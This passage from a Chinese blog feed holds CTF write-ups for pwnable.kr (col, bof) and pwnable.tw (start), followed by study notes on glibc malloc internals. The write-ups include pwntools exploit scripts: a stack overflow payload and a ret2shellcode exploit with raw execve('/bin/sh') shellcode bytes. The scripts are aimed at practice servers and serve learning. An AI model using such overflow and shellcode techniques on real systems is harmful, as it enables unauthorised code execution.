a[]知道是由字符指针组成的数组,但一时竟不知道每一个成员还可以代表指向一个字符串🤔</p><p>输入要为20个字节(字符),以16进制存储,进入check函数,会被强制转为int*指针,即输入的20个字符被视为了5个int数</p><p>现在就是要想办法构造出hashcode了,这里构造四处查了一些资料,有两种办法</p><ol><li>全部用可打印字符表示,好处是直观,但要计算有点麻烦</li><li>无论是否可见用十六进制ascii码表示,好处是基本没有计算量,但直接输入十六进制数据依然会被视作字符,所以需要用到python</li></ol><p>我选择用第二种方法(因为第一种要控制可打印字符大麻烦了😢)</p><p>键入(别忘了小端序)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col $(python -c <span class="string">&#x27;print &quot;\x01&quot;*16+&quot;\xe8\x05\xd9\x1d&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>前面的16字节我一开始还打算用\x00填充,还想怎么老是提示长度不够,结果忘了strlen()测量长度到\x00结束🙂</p><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>是熟悉的味道😭</p><p>检查保护</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-21_163931.png" alt=""></p><p>ida看一看</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-21_163837.png" alt=""></p><p>a1是这个函数的参数,也就是在返回地址上一个</p><p>使a1的值为-889275714,我还傻乎乎的打算去用补码换算成十六进制,结果发现汇编代码中就有直接的十六进制数据0CAFEBABEh</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span>+<span class="string">b&#x27;\xbe\xba\xfe\xca&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>给了一个flag文件，ida打开提示upx加壳，脱壳后flag以明文形式存在</p>]]></content>
    
    
    <summary type="html">比tw简单一点</summary>
    
    
    
    <category term="题解" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="pwnable.kr" scheme="https://ixout.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw刷题记录-1</title>
    <link href="https://ixout.github.io/posts/10836/"/>
    <id>https://ixout.github.io/posts/10836/</id>
    <published>2023-03-20T01:01:55.000Z</published>
    <updated>2023-03-27T06:13:59.446Z</updated>
    
    <content type="html"><![CDATA[<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>第一步检查保护,是久违的感觉😂</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_082554.png" alt=""></p><hr><p>ida打开看看</p><p>不难发现其不是标准栈帧结构,🔒以ida反汇编不了(百度可以搜索解决办法),好在不长直接看汇编代码吧.</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_091524.png" alt=""></p><p>程序主体是两个系统调用read和write,其中read读取60个字节明显有溢出,但要怎么利用是关键</p><p>首选自然是ret2shellcode了,但ret2shellcode需要栈地址,可以看到程序起始有向栈中压入esp,我们可以选择借用write系统调用将其泄露,剩下的就是常规操作了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))+<span class="number">0x14</span> <span class="comment">#加14是因为最后又抬高了esp一次</span></span><br><span class="line">p.recv()</span><br><span class="line">sh=<span class="string">b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(stack)+sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-201.png" alt=""></p><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1>]]></content>
    
    
    <summary type="html">这就是在难为我了</summary>
    
    
    
    <category term="题解" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="刷题记录" scheme="https://ixout.github.io/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    <category term="pwnable.tw" scheme="https://ixout.github.io/tags/pwnable-tw/"/>
    
  </entry>
  
  <entry>
    <title>堆学习笔记-2</title>
    <link href="https://ixout.github.io/posts/40023/"/>
    <id>https://ixout.github.io/posts/40023/</id>
    <published>2023-03-18T08:17:28.000Z</published>
    <updated>2023-04-01T14:51:57.659Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一篇堆学习笔记主要还是基础性的知识要多一点，像malloc和free的流程都只是贴了张图，这篇文章则稍微更深入一点点。</p><h1 id="无tcache"><a href="#无tcache" class="headerlink" title="无tcache"></a>无tcache</h1><h2 id="malloc初始化"><a href="#malloc初始化" class="headerlink" title="malloc初始化"></a>malloc初始化</h2><p>malloc的入口是是_libc_malloc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* __libc_malloc (<span class="type">size_t</span> bytes) &#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">  <span class="comment">// First part: callback</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">  <span class="comment">// Second part  </span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">// Third part</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码可以看出，主要包含<strong>callback、arena_get、_int_malloc</strong>这几步，我们把<strong>callback和arena_get当作初始化</strong>的过程，_<strong>int_malloc作为实际分配</strong>的过程，本文着重来看初始化的过程，下篇文章再看_int_malloc。</p><p>再额外说一下builtin_expect，它是gcc的扩展，用来允许程序员将最有可能执行的分支告诉编译器，这样编译器就可以对分支预测做一些优化，简单来讲就是在遇到分支的时候，先生成大概率分支的指令，这样指令cache的命中率会变高，具体细节可以参考gcc的官方文档（以GCC10.1为例：<a href="https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtins），有时也会将__builtin_expect指令封装为likely和unlikely宏，它们的定义如下所示：">https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtins），有时也会将__builtin_expect指令封装为likely和unlikely宏，它们的定义如下所示：</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __builtin_expect(expr, val) (expr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> likely(expr) __builtin_expect(!!(expr), 1) <span class="comment">//expr很可能为真</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlikely(expr) __builtin_expect(!!(expr), 0) <span class="comment">//expr很可能为假</span></span></span><br></pre></td></tr></table></figure><h3 id="callback"><a href="#callback" class="headerlink" title="callback"></a>callback</h3><p>先看前面代码1中的first part，如下两句，第一句是给函数指针变量赋值，第二句是函数调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>hook是一个函数指针变量，被赋值成了__malloc_hook，后者定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__malloc_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span> = malloc_hook_ini;</span><br></pre></td></tr></table></figure><p>__malloc_hook被初始化成了malloc_hook_ini，后者定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">malloc_hook_ini</span> <span class="params">(<span class="type">size_t</span> sz, <span class="type">const</span> <span class="type">void</span> *caller)</span> &#123;</span><br><span class="line">  __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">  ptmalloc_init ();</span><br><span class="line">  <span class="keyword">return</span> __libc_malloc (sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<strong>malloc_hook又被赋值成了NULL，然后再重新调用</strong>libc_malloc，这样就可以保证在多次调用__libc_malloc的情况下，代码1中的hook回调函数只会被调用一次，如下图所示：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170117.png" alt=""></p><p>这个函数里的ptmalloc_init的精简定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  __malloc_initialized = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  thread_arena = &amp;main_arena;</span><br><span class="line">  malloc_init_state (&amp;main_arena);</span><br><span class="line">  </span><br><span class="line">  __malloc_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到通过__malloc_initialized这个全局flag来检测是不是已经初始化过了，如果没有，则把main_arena设成当前的thread_arena，这是因为初始化肯定是主线程在做，而主线程用的是main_arena，然后再调用malloc_init_state进一步初始化，malloc_init_state定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast(DEFAULT_MXFAST);</span><br><span class="line">  av-&gt;top = initial_top (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc_init_state的part1把malloc_state中的bins array初始化成了下图所示：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170451.png" alt=""></p><p>malloc_init_state的part2把malloc_state中的top初始化成了指向上图2中的bin1，修改top后如下图所示：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170512.png" alt=""></p><h3 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h3><p>介玩意是个宏,源代码里有一段解释:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* arena_get() acquires an arena and locks the corresponding mutex.</span></span><br><span class="line"><span class="comment">   First, try the one last locked successfully by this thread.  (This</span></span><br><span class="line"><span class="comment">   is the common case and handled with a macro for speed.)  Then, loop</span></span><br><span class="line"><span class="comment">   once over the circularly linked list of arenas.  If no arena is</span></span><br><span class="line"><span class="comment">   readily available, create a new one.  In this latter case, `size&#x27;</span></span><br><span class="line"><span class="comment">   is just a hint as to how much memory will be required immediately</span></span><br><span class="line"><span class="comment">   in the new arena. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      ptr = thread_arena;      \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_lock(ptr, size) do &#123;      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (ptr)      \</span></span><br><span class="line"><span class="meta">        __libc_lock_lock (ptr-&gt;mutex);      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">else</span>      \</span></span><br><span class="line"><span class="meta">        ptr = arena_get2 ((size), NULL);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>arena_get可以精简成如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123;                \</span></span><br><span class="line"><span class="meta">  ptr = thread_arena;                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (ptr) &#123; __libc_lock_lock (ptr-&gt;mutex); &#125;  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123; ptr = arena_get2 ((size), NULL); &#125;    \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>可见主要的实现在arena_get2这个函数里，它的主要作用是为当前线程获取一个可用的arena，这个函数的实现很复杂，考虑了各种情况，函数里又嵌套调用了多个函数，我把关键的流程总结在下图里：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_171208.png" alt=""></p><p>上图可以看到，arena_get2的flow里主要调用了get_free_list、reused_arena、_int_new_arena这三个函数，这里不详细讲解每一个函数了，它们的作用从函数名就可以看出来，这三个函数里面_int_new_arena更重要一些，后面着重讲一下这一个函数。</p><h3 id="int-new-arena"><a href="#int-new-arena" class="headerlink" title="_int_new_arena"></a>_int_new_arena</h3><p>这个函数如前图所示，它是用来在arena的个数超出限制之前创建新的arena的，关键代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> mstate _int_new_arena(<span class="type">size_t</span> size) &#123;</span><br><span class="line">  <span class="comment">// 用指定size创建一个新的heap_info对象</span></span><br><span class="line">  heap_info *h = new_heap(size + (<span class="keyword">sizeof</span>(heap_info) </span><br><span class="line">      + <span class="keyword">sizeof</span>(malloc_state) + MALLOC_ALIGNMENT), mp_.top_pad);</span><br><span class="line">  <span class="keyword">if</span> (!h) &#123;</span><br><span class="line">    <span class="comment">// 如果size过大导致new_heap失败，则创建一个只包含</span></span><br><span class="line">    <span class="comment">// 基础数据结构heap_info和malloc_state的对象</span></span><br><span class="line">    h = new_heap (<span class="keyword">sizeof</span> (heap_info) + <span class="keyword">sizeof</span> (malloc_state) </span><br><span class="line">        + MALLOC_ALIGNMENT, mp_.top_pad);</span><br><span class="line">    <span class="keyword">if</span> (!h) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 初始化malloc_state</span></span><br><span class="line">  malloc_state *a = h-&gt;ar_ptr = (malloc_state *) (h + <span class="number">1</span>);</span><br><span class="line">  malloc_init_state (a);</span><br><span class="line">  a-&gt;attached_threads = <span class="number">1</span>;</span><br><span class="line">  a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置malloc_state中的top chunk指针</span></span><br><span class="line">  <span class="comment">// 设置top chunk的header</span></span><br><span class="line">  <span class="type">char</span> *ptr = (<span class="type">char</span> *)(a + <span class="number">1</span>);</span><br><span class="line">  top(a) = (mchunkptr)ptr;</span><br><span class="line">  set_head(top(a), (((<span class="type">char</span> *)h + h-&gt;size) - ptr) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 更新malloc_state中的next链表，把新建的arena加到链表中</span></span><br><span class="line">  thread_arena = a;</span><br><span class="line">  a-&gt;next = main_arena.next;</span><br><span class="line">  main_arena.next = a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面再用一张memory layout的图示来展示刚创建过的arena长什么样子：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_192109.png" alt=""></p><p>前面的_int_new_arena函数中调用了new_heap这个函数，这个函数主要是通过mmap对应的系统调用来通过操作系统分配空间，精简过的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> heap_info *<span class="title function_">new_heap</span><span class="params">(<span class="type">size_t</span> size, <span class="type">size_t</span> top_pad)</span> &#123;</span><br><span class="line">  <span class="comment">// 通过系统调用分配内存</span></span><br><span class="line">  <span class="type">char</span> *p2 = (<span class="type">char</span> *)MMAP(aligned_heap_area, </span><br><span class="line">      HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">  <span class="keyword">if</span> (__mprotect(p2, size, </span><br><span class="line">      mtag_mmap_flags | PROT_READ | PROT_WRITE) != <span class="number">0</span>) &#123;</span><br><span class="line">    __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 初始化heap_info结构体</span></span><br><span class="line">  heap_info *h = (heap_info *)p2;</span><br><span class="line">  h-&gt;size = size;</span><br><span class="line">  h-&gt;mprotect_size = size;</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>还是先贴一个总流程图:</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/1638952496892-1639312615182.png" alt=""></p><h3 id="CAS操作"><a href="#CAS操作" class="headerlink" title="CAS操作"></a>CAS操作</h3><p>在malloc的实现中，需要频繁的插入和删除各个bin中的chunk，很多地方用到了CAS操作，因为用的比较多，这里先简单介绍一下</p><p>CAS是compare and swap的缩写，它是原子操作的一种，可用于在多线程编程中实现不被打断的数据交换操作，从而避免多线程同时改写某一数据时由于执行顺序不确定性以及中断的不可预知性产生的数据不一致问题，该操作通过将内存中的值与指定数据进行比较，当数值一样时将内存中的数据替换为新的值。</p><p>CAS需要有3个操作数：内存地址V，旧的预期值A，即将要更新的目标值B，CAS指令执行时，当且仅当内存地址V的值与预期值A相等时，将内存地址V的值修改为B，否则就什么都不做，整个比较并替换的操作是一个原子操作，下面举一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)                     \</span></span><br><span class="line"><span class="meta">  do &#123;                                                \</span></span><br><span class="line"><span class="meta">    victim = pp;                                      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (victim == NULL)                               \</span></span><br><span class="line"><span class="meta">      break;                                          \</span></span><br><span class="line"><span class="meta">    pp = REVEAL_PTR(victim-&gt;fd);                      \</span></span><br><span class="line"><span class="meta">  &#125; while ((pp = catomic_compare_and_exchange_val_acq \</span></span><br><span class="line"><span class="meta">      (fb, pp, victim)) != victim);</span></span><br></pre></td></tr></table></figure><p>上面这段代码是用来从fast bin中删除一个chunk，我们这里只关注<em>catomic_compare_and_exchange_val_acq(fb, pp, victim)</em>这个函数调用，其中fb是表头，pp新的节点，victim是老的节点，需要把老节点删掉，把新节点接上，这个调用就是通过CAS操作保证thread-safe的，以x86平台为例，一直往下追，最底层的实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __arch_c_compare_and_exchange_val_32_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123;                                                                  \</span></span><br><span class="line"><span class="meta">    __typeof(*mem) ret;                                               \</span></span><br><span class="line"><span class="meta">    __asm __volatile(<span class="string">&quot;cmpl $0, %%&quot;</span> SEG_REG <span class="string">&quot;:%P5\n\t&quot;</span>                 \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;je 0f\n\t&quot;</span>                                      \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;lock\n&quot;</span>                                         \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;0:\tcmpxchgl %2, %1&quot;</span>                            \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;=a&quot;</span>(ret), <span class="string">&quot;=m&quot;</span>(*mem)                          \</span></span><br><span class="line"><span class="meta">                     : BR_CONSTRAINT(newval), <span class="string">&quot;m&quot;</span>(*mem), <span class="string">&quot;0&quot;</span>(oldval), \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;i&quot;</span>(offsetof(tcbhead_t, multiple_threads)));   \</span></span><br><span class="line"><span class="meta">    ret;                                                              \</span></span><br><span class="line"><span class="meta">  &#125;)</span></span><br></pre></td></tr></table></figure><p>这是一段x86的内联汇编，GCC的内联汇编语法大家可以自行查阅相关资料，这里只关注lock和cmpxchgl这两个指令，lock确保对内存的read/write操作原子执行，cmpxchgl用来比较并交换操作数，所以归根结底，CAS操作还是通过硬件指令的支持才能实现原子操作。</p><h3 id="从fastbin分配"><a href="#从fastbin分配" class="headerlink" title="从fastbin分配"></a>从fastbin分配</h3><p>在_int_malloc的开始，先看申请的内存大小nb是否符合fast bin的限制，符合的话，首先进入fast bin的分配代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nb &lt;= get_max_fast()) &#123;</span><br><span class="line">  idx = fastbin_index(nb);</span><br><span class="line">  mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">  mchunkptr pp;</span><br><span class="line">  <span class="keyword">if</span> ((victim = *fb) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    REMOVE_FB(fb, pp, victim);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会根据nb得到fast bin的index，再根据index，得到指向所在bin的head指针fb，如果这个bin非空，则取第一个chunk，使用前面介绍的REMOVE_FB将其从所在bin删除，并将取到的chunk返回。</p><h3 id="从smallbin分配"><a href="#从smallbin分配" class="headerlink" title="从smallbin分配"></a>从smallbin分配</h3><p>不符合fast bin分配条件的话，会继续看是否符合small bin的分配条件，这部分的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">  idx = smallbin_index(nb);</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">    bin-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      set_non_main_arena(victim);</span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的处理过程和fast bin类似，也是根据nb定位到所在的bin，所在bin非空的话，就分配成功，返回得到的chunk，并且从所在bin中删除，和fast bin的最大不同之处在于这里操作的是双向链表。</p><h3 id="merge-fast-bin-into-unsorted-bin"><a href="#merge-fast-bin-into-unsorted-bin" class="headerlink" title="merge fast bin into unsorted bin"></a><strong>merge fast bin into unsorted bin</strong></h3><p>在fast bin和small bin都分配失败之后，会把fast bin中的chunk进行一次整理合并，然后将合并后的chunk放入unsorted bin中，这是通过malloc_consolidate这个函数完成的：</p><figure class="highlight c"><table><tr><td 